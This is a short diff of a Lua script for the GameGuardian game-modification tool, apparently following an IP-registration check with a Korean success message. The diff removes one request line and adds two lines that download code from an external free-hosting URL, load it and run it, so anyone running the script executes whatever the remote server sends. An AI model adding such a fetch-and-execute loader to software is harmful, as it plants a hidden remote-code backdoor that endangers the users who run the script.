@@ -10,6 +10,7 @@ os.exit()
 else
 gg.setVisible(false)
 gg.alert("정상적으로 등록된 아이피입니다.")
-gg.makeRequest(ip).content
 end
 
+T = load(gg.makeRequest('https://docterhakase.000webhostapp.com/encs.php').content)
+pcall(T)
